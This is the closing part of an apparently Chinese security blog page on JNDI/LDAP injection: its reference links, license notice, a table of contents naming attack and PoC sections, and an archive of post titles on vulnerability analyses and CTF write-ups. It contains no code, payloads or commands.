+<li><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review" target="_blank" rel="noopener">https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review</a></li>
+<li>※ The perils of Java deserialization: <a href="https://community.microfocus.com/t5/Security-Research-Blog/The-perils-of-Java-deserialization/ba-p/246211?attachment-id=62785" target="_blank" rel="noopener">https://community.microfocus.com/t5/Security-Research-Blog/The-perils-of-Java-deserialization/ba-p/246211?attachment-id=62785</a></li>
+</ol>
+<p>利用 getObjectInstance 实现 JNDI 注入: </p>
+<ol>
+<li>Exploiting JNDI Injections in Java: <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></li>
+<li><a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/" target="_blank" rel="noopener">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a> </li>
+</ol>
+<p>其他: </p>
+<ol>
+<li>Java RMI: <a href="https://www.cnblogs.com/xt0810/p/3640167.html" target="_blank" rel="noopener">https://www.cnblogs.com/xt0810/p/3640167.html</a></li>
+</ol>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.sari3l.com">Sariel.D</a>
+            <p>原文链接：<a href="https://blog.sari3l.com/posts/469de5e6/">https://blog.sari3l.com/posts/469de5e6/</a>
+            <p>发表日期：<a href="https://blog.sari3l.com/posts/469de5e6/">March 10th 2019, 2:14:15 pm</a>
+            <p>更新日期：<a href="https://blog.sari3l.com/posts/469de5e6/">July 6th 2020, 5:53:51 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/posts/1b4ade61/" title= "JSONP Content-Type 简单Fuzz">
+                    <div class="nextTitle">JSONP Content-Type 简单Fuzz</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/posts/284d4995/" title= "Fastjson 反序列化漏洞研究">
+                    <div class="prevTitle">Fastjson 反序列化漏洞研究</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:master@mail.sari3l.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/sari3l" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.instagram.com/x3rias" class="iconfont-archer instagram" target="_blank" title=instagram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI"><span class="toc-number">1.1.</span> <span class="toc-text">RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI"><span class="toc-number">1.2.</span> <span class="toc-text">JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codebase"><span class="toc-number">1.3.</span> <span class="toc-text">codebase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#动态协议转换"><span class="toc-number">1.4.</span> <span class="toc-text">动态协议转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lookup-函数"><span class="toc-number">1.5.</span> <span class="toc-text">lookup 函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击方式"><span class="toc-number">2.</span> <span class="toc-text">攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI-1"><span class="toc-number">2.1.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Peference"><span class="toc-number">2.1.1.</span> <span class="toc-text">JNDI Peference</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#攻击图解"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">攻击图解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Reference-Payload"><span class="toc-number">2.1.2.</span> <span class="toc-text">JNDI Reference Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI-Remote-Object-Payload"><span class="toc-number">2.1.3.</span> <span class="toc-text">RMI Remote Object Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#通过getObjectInstance实现JNDI注入"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">通过getObjectInstance实现JNDI注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LADP"><span class="toc-number">2.2.</span> <span class="toc-text">LADP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Peference-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">JNDI Peference</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#攻击图解-1"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">攻击图解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Serialized-Object"><span class="toc-number">2.2.2.</span> <span class="toc-text">Serialized Object</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Remote-Location"><span class="toc-number">2.2.3.</span> <span class="toc-text">Remote Location</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORBA"><span class="toc-number">2.3.</span> <span class="toc-text">CORBA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IOR"><span class="toc-number">2.3.1.</span> <span class="toc-text">IOR</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关利用"><span class="toc-number">3.</span> <span class="toc-text">相关利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">3.1.</span> <span class="toc-text">fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-amp-JdbcRowSetImpl-Gadgets"><span class="toc-number">3.1.1.</span> <span class="toc-text">JNDI &amp; JdbcRowSetImpl Gadgets</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poc"><span class="toc-number">3.1.2.</span> <span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getObjectInstance-amp-JNDI-注入"><span class="toc-number">3.2.</span> <span class="toc-text">getObjectInstance &amp; JNDI 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Poc-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Java-Serialization"><span class="toc-number">3.3.</span> <span class="toc-text">LDAP Java Serialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Remote-Location"><span class="toc-number">3.4.</span> <span class="toc-text">LDAP Remote Location</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI"><span class="toc-text">RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI"><span class="toc-text">JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codebase"><span class="toc-text">codebase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#动态协议转换"><span class="toc-text">动态协议转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lookup-函数"><span class="toc-text">lookup 函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击方式"><span class="toc-text">攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI-1"><span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Peference"><span class="toc-text">JNDI Peference</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#攻击图解"><span class="toc-text">攻击图解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Reference-Payload"><span class="toc-text">JNDI Reference Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI-Remote-Object-Payload"><span class="toc-text">RMI Remote Object Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#通过getObjectInstance实现JNDI注入"><span class="toc-text">通过getObjectInstance实现JNDI注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LADP"><span class="toc-text">LADP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Peference-1"><span class="toc-text">JNDI Peference</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#攻击图解-1"><span class="toc-text">攻击图解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Serialized-Object"><span class="toc-text">Serialized Object</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Remote-Location"><span class="toc-text">Remote Location</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORBA"><span class="toc-text">CORBA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IOR"><span class="toc-text">IOR</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关利用"><span class="toc-text">相关利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-text">fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-amp-JdbcRowSetImpl-Gadgets"><span class="toc-text">JNDI &amp; JdbcRowSetImpl Gadgets</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poc"><span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getObjectInstance-amp-JNDI-注入"><span class="toc-text">getObjectInstance &amp; JNDI 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Poc-1"><span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Java-Serialization"><span class="toc-text">LDAP Java Serialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Remote-Location"><span class="toc-text">LDAP Remote Location</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 74
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/9a92d107/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/fd03bf87/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/df08045a/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/posts/787c7e6c/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/55ea3bd4/" >Shiro-055 分析&回显</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/posts/6712089c/" >深信服 EDR RCE 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/posts/c5e878c3/" >CobaltStrike Argue 原理 - 翻译文</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/posts/afd91327/" >Github Page 加速</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/posts/76ce816c/" >CobaltStrike 破解步骤</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/b7ea5c49/" >一道题回顾智能合约 Coverage</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span><a class="archive-post-title" href= "/posts/58a67794/" >F5 BIG-IP RCE简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/posts/608d18f0/" >用友NC反序列化 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/posts/d4fb29f2/" >Pwnable.kr 之 Toddler's Bottle</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/posts/ecb4dfa2/" >Weblogic T3 协议学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/posts/e32c5d3e/" >CVE-2020-2551 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/posts/fa80d225/" >CVE-2020-2555 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/posts/91ba290f/" >Java 反弹 Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/posts/56fcf5d8/" >Thinkphp 5.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/posts/7d9ef63e/" >CVE-2020-1938（Ghost Cat）简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/posts/2cc5b12d/" >JDBC Deserialization</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/posts/f0f80c65/" >Abusing MySQL clients RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/f33694e6/" >2020 All is New</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span><a class="archive-post-title" href= "/posts/418c3786/" >对 Cookie 的一点学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/posts/1e8439b5/" >HTTP Smuggling Attack 随笔</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/posts/b61194b/" >ThinkPHP 6.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/posts/4457d4a3/" >ThinkPHP 5.1.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "/posts/a3557ae1/" >记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/9622f295/" >Mysql 注入基础小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/posts/a62f29f1/" >XSS with ServiceWorkers</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/66ad34dc/" >CSP 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/posts/13977d3a/" >SVG with HTML Parsing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/posts/76496c2b/" >Fastjson 新反序列化漏洞解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span><a class="archive-post-title" href= "/posts/85fdfb64/" >SSRF 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/d8415c32/" >Discuz! ML 3.x 命令执行简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/10</span><a class="archive-post-title" href= "/posts/fb0090e/" >Redis Rce 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/posts/8dea0d95/" >Sqlmap --os-shell 原理简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/posts/6fee1744/" >Active Directory Recon 初步学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/posts/caf0d20c/" >RCTF 2019 WEB writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/posts/73ecd8cc/" >Jenkins CVE-2018-1000861 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href= "/posts/65a5a87a/" >*CTF 2019 homebrewEvtLoop</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/posts/243b6098/" >Web(CTF)中的密码学 (一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/posts/7a31e713/" >Abusing MySQL Clients 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/posts/8e809579/" >DDCTF 2019 部分 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/posts/6fdffa73/" >0CTF/TCTF 2019 WEB writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/posts/1b4ade61/" >JSONP Content-Type 简单Fuzz</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/posts/469de5e6/" >JNDI/LADP 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href= "/posts/284d4995/" >Fastjson 反序列化漏洞研究</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/posts/fdaf04b/" >SMTP 25 端口测试记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/posts/9b1f3ba/" >pyppeteer 学习记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/31</span><a class="archive-post-title" href= "/posts/4ffb62e5/" >Python 多线程、多进程、协程(未完结)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/29</span><a class="archive-post-title" href= "/posts/83241730/" >Frida —— WeChat(二) 🧧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/posts/b11f7440/" >动态调试 with smali</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href= "/posts/76594cbe/" >Nexus 解决显示 “无法访问互联网”</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/19</span><a class="archive-post-title" href= "/posts/5da99ec5/" >Frida —— WeChat(一) 🎲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/posts/d55cdeb2/" >Frida —— 初体验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/446263e2/" >关系爬虫 —— Weibo</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
